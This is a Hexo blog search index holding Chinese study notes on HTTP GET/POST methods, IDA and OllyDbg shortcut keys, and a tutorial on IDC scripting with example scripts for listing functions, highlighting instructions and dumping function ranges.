<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTTP</title>
    <url>/2023/02/23/HTTP/</url>
    <content><![CDATA[<p>HTTP<br>HTTP 充当客户端和服务器之间的请求-响应协议。最常用的两种方法是：GET 和 POST。</p>
<h2 id="GET-方法"><a href="#GET-方法" class="headerlink" title="GET 方法"></a>GET 方法</h2><p>GET 用于从指定资源请求数据。<br>请注意，查询字符串（名称/值对）是在 GET 请求的 URL 中发送的：<br>/test/demo_form.php?name1=value1&amp;name2=value2<br>有关 GET 请求的其他一些注释：<br>GET 请求可被缓存<br>GET 请求保留在浏览器历史记录中<br>GET 请求可被收藏为书签<br>GET 请求不应在处理敏感数据时使用<br>GET 请求有长度限制<br>GET 请求只应当用于取回数据（不修改）</p>
<h2 id="POST-方法"><a href="#POST-方法" class="headerlink" title="POST 方法"></a>POST 方法</h2><p>POST 用于将数据发送到服务器来创建/更新资源。<br>通过 POST 发送到服务器的数据存储在 HTTP 请求的请求主体中：<br>POST /test/demo_form.php HTTP/1.1<br>Host: w3school.com.cn<br>name1=value1&amp;name2=value2<br>有关 POST 请求的其他一些注释：<br>POST 请求不会被缓存<br>POST 请求不会保留在浏览器历史记录中<br>POST 不能被收藏为书签<br>POST 请求对数据长度没有要求<br>                       GET                        POST<br>后退按钮/刷新          无害                        数据会被重新提交（浏览器应该告知用户数据会被重新提交）。<br>书签                    可收藏为书签    不可收藏为书签<br>缓存                    能被缓存                   不能缓存<br>编码类型    application/x-www-form-urlencoded    application/x-www-form-urlencoded 或 multipart/form-data。为二进制数据使用多重编码。<br>历史                 参数保留在浏览器历史中        参数不会保存在浏览器历史中。<br>对数据长度的限制    是的。当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是 2048 个字符）。           无限制。<br>对数据类型的限制     只允许 ASCII 字符。            没有限制。也允许二进制数据。<br>安全性<br>与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分。<br>在发送密码或其他敏感信息时绝不要使用 GET ！<br>POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中。<br>可见性              数据在 URL 中对所有人都是可见的。      数据不会显示在 URL 中。</p>
<p>HTTP请求：<br>请求行：<br>     方法：<br>          GET 获取资源<br>          POST向服务器端发送数据，传输实体主体<br>          PUT 传输文件<br>          HEAD 获取报文首部<br>          DELETE 删除文件<br>          OPTIONS 询问支持的方法<br>          TEACE 追踪路径</p>
]]></content>
  </entry>
  <entry>
    <title>IDA快捷键</title>
    <url>/2023/02/23/IDA%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<p>IDA快捷键<br>F5+空格     chr  ord<br>upx脱壳<br>v5+i=v5[i]</p>
<p>ida小端序<br> r转换成字符  倒着读  h切换为10进制<br> shift+f12快捷命令进入<br>a：将数据转换为字符串<br>esc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）<br>shift+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置<br>ctrl+w：保存ida数据库<br>ctrl+s：选择某个数据段，直接进行跳转<br>ctrl+鼠标滚轮：能够调节流程视图的大小<br>x：对着某个函数、变量按该快捷键，可以查看它的交叉引用<br>g：直接跳转到某个地址<br>n：更改变量的名称<br>y：更改变量的类型<br>/ ：在反编译后伪代码的界面中写下注释<br>\：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多<br>；：在反汇编后的界面中写下注释<br>ctrl+shift+w：拍摄IDA快照<br>u：undefine，取消定义函数、代码、数据的定义<br>D（Data）：即让某一个位置变成数据。一直以按D键，这个位置的数据类型将会以1字节，2字节，4字节，8字节进行循环。IDA为了防止误操作，如果定义数据的操作会影响到已经有数据类型的位置，IDA会弹出确认的对话框；如果操作的位置及其附近完全十Undefined，则不会弹出确认对话框。<br>C（Code）键：即让某一个位置变为指令。确认对话框的弹出时机也与D键类似。在定义为指令后，IDA会自动以此为其实位置进行递归下降反汇编<br>A（ASCII）键：会以该位置为起点定义一个“\0”结尾的字符串类型。<br>*键：将此处定义为一个数组，此时弹出一个对话框，用来设置数组的属性。<br>O(Offset）键：即将此处定义为一个地址偏移.</p>
<p>下面的是函数的操作<br>删除函数：在函数窗口中选中函数，按Delete键；<br>定义函数：在反汇编窗口中选中对应行后，按P键；<br>修改函数参数：在函数窗口中选中并按Ctrl+E组合键，或在反汇编窗口的函数内部按Alt+P组合键。</p>
<p>下面是导航操作<br>后退到上一步位置：快捷键Esc<br>前进到下一个位置：快捷键Ctrl+Enter。<br>跳转到某一个特定位置：快捷键G，然后可以输入地址/已经定义的名称。<br>跳转到某一区段：快捷键Ctrl+S，然后选择区段即可。<br>Shift+e 数据总结</p>
<p>OD 右键-&gt;中文搜索引擎-&gt;ASCII码  F2下端点-&gt;运行  cmp比较  nop空命令   jmp跳转</p>
]]></content>
  </entry>
  <entry>
    <title>IDA中的IDC脚本编写笔记</title>
    <url>/2023/02/26/IDA%E4%B8%AD%E7%9A%84IDC%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="IDC"><a href="#IDC" class="headerlink" title="IDC"></a>IDC</h2><p>首先，什么是IDC？<br>IDC是IDA中支持的一门与C语言类似的语言，但是它是解释型的，并不是编译型的，于此同时IDC还融合了一些python中的元素以方便一些内容的处理。</p>
<p>在IDA中按下【shift+F2】可调出脚本编译器</p>
<h4 id="IDC语句"><a href="#IDC语句" class="headerlink" title="IDC语句"></a>IDC语句</h4><p>IDC支持C中的语言，除了switch</p>
<h4 id="IDC表达式"><a href="#IDC表达式" class="headerlink" title="IDC表达式"></a>IDC表达式</h4><p>IDC几乎都能支持C语言中的操作运算表达（加减乘除、判等家族），但是明确说明不支持+=。<br>在进行操作运算的时候，只有操作中存在64bit的操作，那么其他操作也会编程64bit的。</p>
<h4 id="IDC预定义符号"><a href="#IDC预定义符号" class="headerlink" title="IDC预定义符号"></a>IDC预定义符号</h4><p>IDC有一些符号是提前定义好了的，其内容和含义如下：</p>
<pre><code class="hljs bash">_NT_           IDA is running under MS Windows
_LINUX_        IDA is running under Linux
_MAC_          IDA is running under Mac OS X
_UNIX_         IDA is running under Unix (linux or mac)
_EA64_         64-bit version IDA
_QT_           GUI version of IDA (Qt)
_GUI           GUI version of IDA
_TXT_          Text version of IDA
_IDA_VERSION_  The current IDA version. For example: <span class="hljs-string">&quot;7.5&quot;</span>
_IDAVER_       The current, numerical IDA version. For example: <span class="hljs-string">&quot;750&quot;</span> means v7.5
</code></pre>
<h4 id="IDC字符串操作（切片）"><a href="#IDC字符串操作（切片）" class="headerlink" title="IDC字符串操作（切片）"></a>IDC字符串操作（切片）</h4><p>IDC中对于字符串的操作应该是借鉴了python，其string类型的操作支持切片操作（slices）。</p>
<pre><code class="hljs bash">str[i1:i2] - substring from i1 to i2. i2 is excluded，If i1 &gt;= i2, empty string is returned.
str[idx]   - one character substring at <span class="hljs-string">&#x27;idx&#x27;</span>.
             this is equivalent to str[idx:idx+1]
str[:idx]  - substring from the beginning of the string to idx
             this is equivalent to str[0:idx]
str[idx:]  - substring from idx to the end of the string
             this is equivalent to str[idx:0x7fffffff]
</code></pre>
<h4 id="IDC异常处理"><a href="#IDC异常处理" class="headerlink" title="IDC异常处理"></a>IDC异常处理</h4><p>IDC异常处理中，可以使用的表达语句：</p>
<pre><code class="hljs bash">      auto e;
      try 
      &#123;
        ... some statements that cause a runtime error...
      &#125;
      catch ( e )
      &#123;
        // e holds the exception information
        // it is an instance of the exception class
      &#125;


throw xx;  <span class="hljs-comment">#抛出</span>
</code></pre>
<h4 id="IDC程序"><a href="#IDC程序" class="headerlink" title="IDC程序"></a>IDC程序</h4><p>如果只是需要进行简单的查询或者查看，可以直接编写个别行的函数完成编写，但是如果一个脚本应用需要执行大量的IDC程序，并且还可能会在很多场景下需要重复使用，那么我们可能需要创建一个独立的IDC程序文件。<br>IDC程序文件要求用户使用用户定义的函数，并且至少定义一个没有参数的main函数，此外主程序文件中必须包含idc.idc头文件。</p>
<pre><code class="hljs c"><span class="hljs-meta">#idc程序文件基本结构</span>
#Include &lt;idc.idc&gt;
<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
   Message(<span class="hljs-string">&quot;this is a IDC scipt file&quot;</span>);
&#125;
</code></pre>

<pre><code class="hljs bash">IDC支持如下C预处理指令：

<span class="hljs-comment">#include &lt;文件&gt; ；将指定的文件包含在当前文件中</span>

<span class="hljs-comment">#define &lt;宏名称&gt;[可选项] ；创建宏，可以选择给宏分配指定的值</span>

<span class="hljs-comment">#ifdef &lt;名称&gt;; 测试指定的宏是否存在</span>

<span class="hljs-comment">#else 与ifdef一起使用</span>

<span class="hljs-comment">#endif 通过ifdef指定定义终止符</span>

<span class="hljs-comment">#undef &lt;名称&gt; ；删除指定的宏</span></code></pre>
<h4 id="常用idc函数"><a href="#常用idc函数" class="headerlink" title="常用idc函数"></a>常用idc函数</h4><h6 id="读取和修改数据的函数"><a href="#读取和修改数据的函数" class="headerlink" title="读取和修改数据的函数"></a>读取和修改数据的函数</h6><p>下面这些函数可用于访问IDA数据库中的各个字节、字及双字。</p>
<ul>
<li>long Byte(long addr): 从虚拟地址addr处读取一个字节（1字节）的值。</li>
<li>long Word(long addr): 从虚拟地址addr处读取一个字节（2字节）的值。</li>
<li>long Dword(long addr): 从虚拟地址addr处读取一个双字（4字节）的值。</li>
<li>void PatchByte(long addr,long val): 设置虚拟地址addr处一个字节（1字节）的值为val。</li>
<li>void PatchWord(long addr,long val): 设置虚拟地址addr处一个字节（2字节）的值为val。</li>
<li>void PatchDword(long addr,long val): 设置虚拟地址addr处一个双字（4字节）的值为val。</li>
<li>bool isLoaded(long addr): 如果虚拟地址addr中包含有效数据则返回，否则返回0。<h6 id="用户交互函数"><a href="#用户交互函数" class="headerlink" title="用户交互函数"></a>用户交互函数</h6>idc脚本没有任何调试工具，所以可以依靠输出函数实现调试。<br><img src="https://img-blog.csdnimg.cn/5a33ddc47f8a48a0af5be8e77f83be08.png" alt="一个个打太多了，别人总结好的"></li>
</ul>
<h6 id="字符串操作函数"><a href="#字符串操作函数" class="headerlink" title="字符串操作函数"></a>字符串操作函数</h6><p><img src="https://img-blog.csdnimg.cn/bc602657d9ec43a0aea0e64a308a2085.png" alt="在这里插入图片描述"></p>
<h6 id="数据库名称操作函数"><a href="#数据库名称操作函数" class="headerlink" title="数据库名称操作函数"></a>数据库名称操作函数</h6><p><img src="https://img-blog.csdnimg.cn/8aaa9c7fd18f4e3b9d932455f5b7733a.png" alt="在这里插入图片描述"></p>
<h6 id="处理函数的函数"><a href="#处理函数的函数" class="headerlink" title="处理函数的函数"></a>处理函数的函数</h6><p><img src="https://img-blog.csdnimg.cn/1c3b1c0afc194ea180a217184b99cedd.png" alt="在这里插入图片描述"></p>
<h6 id="代码交叉引用函数"><a href="#代码交叉引用函数" class="headerlink" title="代码交叉引用函数"></a>代码交叉引用函数</h6><p><img src="https://img-blog.csdnimg.cn/0ca0998cdf154bdf894f88c093b52630.png" alt="在这里插入图片描述"></p>
<h6 id="数据交叉引用函数"><a href="#数据交叉引用函数" class="headerlink" title="数据交叉引用函数"></a>数据交叉引用函数</h6><p><img src="https://img-blog.csdnimg.cn/18d94a93b590495f90a5eb18dc98b26d.png" alt="在这里插入图片描述"></p>
<h6 id="数据库操纵函数"><a href="#数据库操纵函数" class="headerlink" title="数据库操纵函数"></a>数据库操纵函数</h6><p><img src="https://img-blog.csdnimg.cn/3d52ee410bad4055bcc87821feab1cae.png" alt="在这里插入图片描述"></p>
<h6 id="数据库搜素函数"><a href="#数据库搜素函数" class="headerlink" title="数据库搜素函数"></a>数据库搜素函数</h6><p><img src="https://img-blog.csdnimg.cn/a1167f75c7564f9786b699f8c5803280.png" alt="在这里插入图片描述"></p>
<h6 id="反汇编行组件"><a href="#反汇编行组件" class="headerlink" title="反汇编行组件"></a>反汇编行组件</h6><p><img src="https://img-blog.csdnimg.cn/1abba0cd47214fc3af9a307cb84f632f.png" alt="在这里插入图片描述"></p>
<h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><h6 id="简单的IF语句"><a href="#简单的IF语句" class="headerlink" title="简单的IF语句"></a>简单的IF语句</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> CurrAddress = ScreenEA(); 
    <span class="hljs-keyword">if</span>(CurrAddress == <span class="hljs-number">0x401161</span>)
    &#123;
       Message(<span class="hljs-string">&quot;程序OEP =&gt; 0x%x \n&quot;</span>,CurrAddress);
    &#125;
    <span class="hljs-keyword">else</span>
    &#123;
      Message(<span class="hljs-string">&quot;没有扎到OEP \n&quot;</span>);
    &#125;
&#125;
</code></pre>
<h6 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> origEA,currEA,funcStart,funcEnd;
    
    origEA = ScreenEA();
    <span class="hljs-comment">// origEA = OEP 如果origEA 不在函数内则返回-1</span>
    funcStart = GetFunctionAttr(origEA,FUNCATTR_START);
    
    funcEnd = GetFunctionAttr(origEA,FUNCATTR_END);
    
    <span class="hljs-comment">//Message(&quot;OEP: %x 起始地址: %x --&gt; 结束地址: %x \n&quot;,origEA,funcStart,funcEnd);</span>
    
    <span class="hljs-comment">// NextHead 在currEA开始的位置寻找下一条指令的地址</span>
    <span class="hljs-keyword">for</span>(currEA = funcStart; currEA != <span class="hljs-number">-1</span>; currEA=NextHead(currEA,funcEnd))
    &#123;
        Message(<span class="hljs-string">&quot;--&gt; %8x \n&quot;</span>,currEA);
    &#125;
&#125;
</code></pre>
<h6 id="while语句实现"><a href="#while语句实现" class="headerlink" title="while语句实现"></a>while语句实现</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> origEA,currEA,funcStart,funcEnd;
    
    origEA = ScreenEA();
    <span class="hljs-comment">// origEA = OEP 如果origEA 不在函数内则返回-1</span>
    funcStart = GetFunctionAttr(origEA,FUNCATTR_START);
    
    funcEnd = GetFunctionAttr(origEA,FUNCATTR_END);
    
    <span class="hljs-comment">//Message(&quot;OEP: %x 起始地址: %x --&gt; 结束地址: %x \n&quot;,origEA,funcStart,funcEnd);</span>
    
    <span class="hljs-keyword">while</span>(currEA != BADADDR)
    &#123;
        Message(<span class="hljs-string">&quot;--&gt; %x \n&quot;</span>,currEA);
        currEA = NextHead(currEA,funcEnd);
    &#125;
&#125;
</code></pre>
<h6 id="idc函数"><a href="#idc函数" class="headerlink" title="idc函数"></a>idc函数</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-comment">// 定义一个函数</span>
<span class="hljs-type">static</span> <span class="hljs-title function_">OutPutAddress</span><span class="hljs-params">(MyString)</span>
&#123;
    <span class="hljs-keyword">auto</span> currAddress;
    currAddress = ScreenEA();
    Message(<span class="hljs-string">&quot;%d \n&quot;</span>,MyString);
    <span class="hljs-keyword">return</span> currAddress;
&#125;

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> ret = OutPutAddress(<span class="hljs-number">123</span>);
    Message(<span class="hljs-string">&quot;%x \n&quot;</span>,ret);
    
&#125;
</code></pre>
<h6 id="idc获取函数名"><a href="#idc获取函数名" class="headerlink" title="idc获取函数名"></a>idc获取函数名</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> origEA,currEA,funcStart,funcEnd;
    
    origEA = ScreenEA();
    <span class="hljs-comment">// origEA = OEP 如果origEA 不在函数内则返回-1</span>
    funcStart = GetFunctionAttr(origEA,FUNCATTR_START);
    
    funcEnd = GetFunctionAttr(origEA,FUNCATTR_END);
    
    <span class="hljs-comment">//Message(&quot;OEP: %x 起始地址: %x --&gt; 结束地址: %x \n&quot;,origEA,funcStart,funcEnd);</span>
    
    <span class="hljs-keyword">while</span>(currEA != BADADDR)
    &#123;
        Message(<span class="hljs-string">&quot;--&gt; %x name: %s \n&quot;</span>,currEA,GetFunctionName(currEA));
        currEA = NextHead(currEA,funcEnd);
    &#125;
&#125;
</code></pre>
<h6 id="idc枚举所有函数"><a href="#idc枚举所有函数" class="headerlink" title="idc枚举所有函数"></a>idc枚举所有函数</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> currAddr,func,endSeg,funcName,counter;
    
    currAddr = ScreenEA();
    func = SegStart(currAddr);
    endSeg = SegEnd(currAddr);
    
    Message(<span class="hljs-string">&quot;%x --&gt; %x \n&quot;</span>,func,endSeg);
    
    counter = <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">while</span>(func != BADADDR &amp;&amp; func &lt; endSeg)
    &#123;
        funcName = GetFunctionName(func);
        <span class="hljs-keyword">if</span>(funcName != <span class="hljs-string">&quot; &quot;</span>)
        &#123;
            Message(<span class="hljs-string">&quot;%x --&gt; %s \n&quot;</span>,func,funcName);
            counter++;
        &#125;
        func = NextFunction(func);
    &#125;
     
&#125;
</code></pre>
<h6 id="枚举指定函数并输出"><a href="#枚举指定函数并输出" class="headerlink" title="枚举指定函数并输出"></a>枚举指定函数并输出</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> currAddr,func,endSeg,funcName,counter;
    
    currAddr = ScreenEA();
    func = SegStart(currAddr);
    endSeg = SegEnd(currAddr);
    
    Message(<span class="hljs-string">&quot;%x --&gt; %x \n&quot;</span>,func,endSeg);
    
    counter = <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">while</span>(func != BADADDR &amp;&amp; func &lt; endSeg)
    &#123;
        funcName = GetFunctionName(func);
        <span class="hljs-keyword">if</span>(funcName != <span class="hljs-string">&quot; &quot;</span>)
        &#123;
        
            <span class="hljs-keyword">if</span>(funcName == <span class="hljs-string">&quot;__lock&quot;</span>)
            &#123;
                Message(<span class="hljs-string">&quot;%x --&gt; %s \n&quot;</span>,func,funcName);
            &#125;
            
            counter++;
        &#125;
        func = NextFunction(func);
    &#125;
&#125;
</code></pre>
<h6 id="寻找特殊指令，并高亮显示"><a href="#寻找特殊指令，并高亮显示" class="headerlink" title="寻找特殊指令，并高亮显示"></a>寻找特殊指令，并高亮显示</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>
<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
&#123;
    <span class="hljs-keyword">auto</span> head, op;
    head = NextHead(<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0xFFFFFFFF</span>);
    <span class="hljs-keyword">while</span> ( head != BADADDR )
    &#123;
        op = GetMnem(head);
        Message(<span class="hljs-string">&quot;%x %s \n&quot;</span>,head,op);

        
        <span class="hljs-keyword">if</span> ( op == <span class="hljs-string">&quot;jmp&quot;</span> || op == <span class="hljs-string">&quot;call&quot;</span> )
            SetColor(head, CIC_ITEM, <span class="hljs-number">0x010187</span>);
            
        <span class="hljs-keyword">if</span> (op == <span class="hljs-string">&quot;xor&quot;</span>)
            SetColor(head, CIC_ITEM, <span class="hljs-number">0x010198</span>);
        head = NextHead(head, <span class="hljs-number">0xFFFFFFFF</span>);
    &#125;
&#125;
</code></pre>
<h6 id="ida-dump"><a href="#ida-dump" class="headerlink" title="ida dump"></a>ida dump</h6><p>将函数dump到本地</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">getFuncName</span><span class="hljs-params">(ea)</span>
&#123;
    <span class="hljs-keyword">auto</span> funcName = get_func_name(ea);
      
    <span class="hljs-keyword">auto</span> dm = demangle_name(funcName, get_inf_attr(INF_LONG_DN));
    <span class="hljs-keyword">if</span>(dm != <span class="hljs-number">0</span>)
    &#123;
        funcName = dm;
    &#125;
    <span class="hljs-keyword">return</span> funcName;
&#125;

<span class="hljs-type">static</span> <span class="hljs-title function_">functionDump</span><span class="hljs-params">(ea)</span>
&#123;
    <span class="hljs-keyword">auto</span> funcName = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">auto</span> end = <span class="hljs-number">0x0</span>;
    <span class="hljs-keyword">auto</span> file_open = get_idb_path()[<span class="hljs-number">0</span>:<span class="hljs-number">-4</span>] + <span class="hljs-string">&quot;_dump.log&quot;</span>;
    <span class="hljs-keyword">auto</span> stream = fopen(file_open, <span class="hljs-string">&quot;w&quot;</span>);
    <span class="hljs-keyword">auto</span> peekAhead;

    <span class="hljs-keyword">while</span>( ea != BADADDR )
    &#123;
        ea = NextFunction(ea);      
        peekAhead = NextFunction(ea);
        end = FindFuncEnd(ea);   
        funcName = getFuncName(ea);

        <span class="hljs-keyword">if</span>(peekAhead == BADADDR)
        &#123;
            <span class="hljs-built_in">fprintf</span>(stream, <span class="hljs-string">&quot;&#123; 0x%X, 0x%X, \&quot;%s\&quot; &#125;\n&quot;</span>, ea, end, funcName);
            ea = peekAhead;
            <span class="hljs-keyword">continue</span>;
        &#125;
            end = peekAhead - <span class="hljs-number">1</span>;      
            <span class="hljs-built_in">fprintf</span>(stream, <span class="hljs-string">&quot;&#123; 0x%X, 0x%X, \&quot;%s\&quot; &#125;\n&quot;</span>, ea, end,funcName);
    &#125;
        fclose(stream);
&#125;

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    functionDump(<span class="hljs-number">0x40000</span>);
&#125;
</code></pre>
<h6 id="全量反汇编："><a href="#全量反汇编：" class="headerlink" title="全量反汇编："></a>全量反汇编：</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
&#123;


    <span class="hljs-keyword">auto</span> decode = <span class="hljs-number">0x401000</span>;
    <span class="hljs-keyword">auto</span> xref;
    
    <span class="hljs-keyword">for</span>(xref = RfirstB(decode); xref != BADADDR; xref = RnextB(decode,xref))
    &#123;
         Message(<span class="hljs-string">&quot;xref: %x\n&quot;</span>,xref);
    
    <span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>;
      <span class="hljs-keyword">auto</span> inst = xref;
    <span class="hljs-keyword">auto</span> op;
        
        
       <span class="hljs-keyword">while</span>((i &lt; <span class="hljs-number">100</span>) )
       &#123;
        inst = FindCode(inst,<span class="hljs-number">0x00</span>); <span class="hljs-comment">// flag set to backwards</span>
      op = GetDisasm(inst); <span class="hljs-comment">// get</span>
      
      Message(<span class="hljs-string">&quot;%x --&gt; %s \n&quot;</span>,inst,op);
        i++;
       &#125;
    &#125; 
&#125;
</code></pre>
<h6 id="查找特定指令片段"><a href="#查找特定指令片段" class="headerlink" title="查找特定指令片段"></a>查找特定指令片段</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-keyword">auto</span> currAddr,startSeg,endSeg;
    
    currAddr = ScreenEA();
    startSeg = SegStart(currAddr);
    endSeg = SegEnd(currAddr);
    
    Message(<span class="hljs-string">&quot;OEP = %x 起始地址: %x 结束地址: %x \n&quot;</span>,currAddr,startSeg,endSeg);
    
    <span class="hljs-keyword">while</span>(startSeg &lt; endSeg)
    &#123;
        <span class="hljs-keyword">auto</span> op = GetDisasm(startSeg);
        
        <span class="hljs-comment">// 查找第一条指令</span>
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(op,<span class="hljs-string">&quot;push    esi&quot;</span>)==<span class="hljs-number">0</span>)
        &#123;
            startSeg++;
            op = GetDisasm(startSeg);
            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(op,<span class="hljs-string">&quot;push    edi&quot;</span>))
            &#123;
                Message(<span class="hljs-string">&quot;特征: %x \n&quot;</span>,startSeg<span class="hljs-number">-1</span>);
            &#125;
        &#125;
        startSeg++;
    &#125;
&#125;
</code></pre>
<h6 id="全局数组操作："><a href="#全局数组操作：" class="headerlink" title="全局数组操作："></a>全局数组操作：</h6><p>数组是全局的，并写入数据库，白嫖完了，一定得释放</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-comment">// 创建数组元素</span>
    <span class="hljs-keyword">auto</span> array_ptr = CreateArray(<span class="hljs-string">&quot;array&quot;</span>);
    <span class="hljs-comment">// 获取数组指针</span>
    <span class="hljs-keyword">auto</span> ptr = GetArrayId(<span class="hljs-string">&quot;array&quot;</span>);
    
    Message(<span class="hljs-string">&quot;获取到的操作指针: %x \n&quot;</span>,ptr);
    
    <span class="hljs-comment">// 设置两个字符串变量</span>
    SetArrayString(ptr,<span class="hljs-number">0</span>,<span class="hljs-string">&quot;hello&quot;</span>);
    SetArrayString(ptr,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;lyshark&quot;</span>);
    
    <span class="hljs-comment">// 设置两个整数变量</span>
    SetArrayLong(ptr,<span class="hljs-number">2</span>,<span class="hljs-number">100</span>);
    SetArrayLong(ptr,<span class="hljs-number">3</span>,<span class="hljs-number">200</span>);
    
    <span class="hljs-comment">// 如果提取字符串使用 AR_STR 标记 ，提取整数使用 AR_LONG</span>
    <span class="hljs-keyword">auto</span> st = GetArrayElement(AR_STR,ptr,<span class="hljs-number">0</span>);
    <span class="hljs-keyword">auto</span> st1 = GetArrayElement(AR_STR,ptr,<span class="hljs-number">1</span>);
    Message(<span class="hljs-string">&quot;提取字符串变量: %s %s !\n&quot;</span>,st,st1);
    
    <span class="hljs-keyword">auto</span> lo = GetArrayElement(AR_LONG,ptr,<span class="hljs-number">2</span>);
    Message(<span class="hljs-string">&quot;提取整数变量: %d \n&quot;</span>,lo);
    
    <span class="hljs-comment">// 删除数组的0号元素</span>
    DelArrayElement(AR_STR,ptr,<span class="hljs-number">0</span>);
    <span class="hljs-comment">// 注销整个数组</span>
    DeleteArray(ptr);
&#125;
</code></pre>
<h6 id="字符串处理函数："><a href="#字符串处理函数：" class="headerlink" title="字符串处理函数："></a>字符串处理函数：</h6><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-comment">// 格式化字符串,类似于sprintf</span>
    <span class="hljs-keyword">auto</span> name = form(<span class="hljs-string">&quot;hello %s&quot;</span>,<span class="hljs-string">&quot;lyshark&quot;</span>);
    Message(<span class="hljs-string">&quot;格式化后的内容: %s \n&quot;</span>,name);
    
    Message(<span class="hljs-string">&quot;十六进制转为整数: %d \n&quot;</span>,xtol(<span class="hljs-string">&quot;0x41&quot;</span>));
    Message(<span class="hljs-string">&quot;十进制100转为八进制: %d \n&quot;</span>,ltoa(<span class="hljs-number">100</span>,<span class="hljs-number">8</span>));
    Message(<span class="hljs-string">&quot;十进制100转换二进制: %d \n&quot;</span>,ltoa(<span class="hljs-number">100</span>,<span class="hljs-number">2</span>));
    Message(<span class="hljs-string">&quot;字符A的ASCII: %d \n&quot;</span>,ord(<span class="hljs-string">&quot;A&quot;</span>));
    Message(<span class="hljs-string">&quot;计算字符串长度: %d \n&quot;</span>,<span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;hello lyshark&quot;</span>));
    
    <span class="hljs-comment">// 在著字符串中寻找子串</span>
    <span class="hljs-keyword">auto</span> main = <span class="hljs-string">&quot;hello lyshark&quot;</span>;
    <span class="hljs-keyword">auto</span> sub = <span class="hljs-string">&quot;lyshark&quot;</span>;
    Message(<span class="hljs-string">&quot;寻找子串: %d \n&quot;</span>,<span class="hljs-built_in">strstr</span>(main,sub));
&#125;
</code></pre>
